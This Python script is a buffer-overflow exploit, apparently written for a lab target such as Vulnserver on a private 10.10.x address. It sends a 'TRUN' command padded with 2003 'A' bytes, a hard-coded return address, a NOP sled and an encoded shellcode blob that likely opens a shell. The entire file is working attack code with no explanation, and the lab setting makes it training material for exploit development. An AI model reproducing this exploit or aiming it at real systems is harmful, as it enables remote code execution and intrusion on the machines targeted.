import sys
import socket
from time import sleep

junk = "A" * 2003
ret = "\xaf\x11\x50\x62"
code = ("\xda\xd9\xbe\x7e\x51\x86\x0f\xd9\x74\x24\xf4\x5a\x2b\xc9\xb1"
"\x52\x83\xea\xfc\x31\x72\x13\x03\x0c\x42\x64\xfa\x0c\x8c\xea"
"\x05\xec\x4d\x8b\x8c\x09\x7c\x8b\xeb\x5a\x2f\x3b\x7f\x0e\xdc"
"\xb0\x2d\xba\x57\xb4\xf9\xcd\xd0\x73\xdc\xe0\xe1\x28\x1c\x63"
"\x62\x33\x71\x43\x5b\xfc\x84\x82\x9c\xe1\x65\xd6\x75\x6d\xdb"
"\xc6\xf2\x3b\xe0\x6d\x48\xad\x60\x92\x19\xcc\x41\x05\x11\x97"
"\x41\xa4\xf6\xa3\xcb\xbe\x1b\x89\x82\x35\xef\x65\x15\x9f\x21"
"\x85\xba\xde\x8d\x74\xc2\x27\x29\x67\xb1\x51\x49\x1a\xc2\xa6"
"\x33\xc0\x47\x3c\x93\x83\xf0\x98\x25\x47\x66\x6b\x29\x2c\xec"
"\x33\x2e\xb3\x21\x48\x4a\x38\xc4\x9e\xda\x7a\xe3\x3a\x86\xd9"
"\x8a\x1b\x62\x8f\xb3\x7b\xcd\x70\x16\xf0\xe0\x65\x2b\x5b\x6d"
"\x49\x06\x63\x6d\xc5\x11\x10\x5f\x4a\x8a\xbe\xd3\x03\x14\x39"
"\x13\x3e\xe0\xd5\xea\xc1\x11\xfc\x28\x95\x41\x96\x99\x96\x09"
"\x66\x25\x43\x9d\x36\x89\x3c\x5e\xe6\x69\xed\x36\xec\x65\xd2"
"\x27\x0f\xac\x7b\xcd\xea\x27\x8e\x1b\x5e\xcc\xe6\x19\x9e\x22"
"\xab\x94\x78\x2e\x43\xf1\xd3\xc7\xfa\x58\xaf\x76\x02\x77\xca"
"\xb9\x88\x74\x2b\x77\x79\xf0\x3f\xe0\x89\x4f\x1d\xa7\x96\x65"
"\x09\x2b\x04\xe2\xc9\x22\x35\xbd\x9e\x63\x8b\xb4\x4a\x9e\xb2"
"\x6e\x68\x63\x22\x48\x28\xb8\x97\x57\xb1\x4d\xa3\x73\xa1\x8b"
"\x2c\x38\x95\x43\x7b\x96\x43\x22\xd5\x58\x3d\xfc\x8a\x32\xa9"
"\x79\xe1\x84\xaf\x85\x2c\x73\x4f\x37\x99\xc2\x70\xf8\x4d\xc3"
"\x09\xe4\xed\x2c\xc0\xac\x0e\xcf\xc0\xd8\xa6\x56\x81\x60\xab"
"\x68\x7c\xa6\xd2\xea\x74\x57\x21\xf2\xfd\x52\x6d\xb4\xee\x2e"
"\xfe\x51\x10\x9c\xff\x73" )

try:
    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect(('10.10.167.211',9999))

    s.send("TRUN /.:/" + junk + ret + "\x90"*32 + code )
    s.close();
except:
    #print("the buffer flown at %s", str(len(buffer)))
    sys.exit()
         
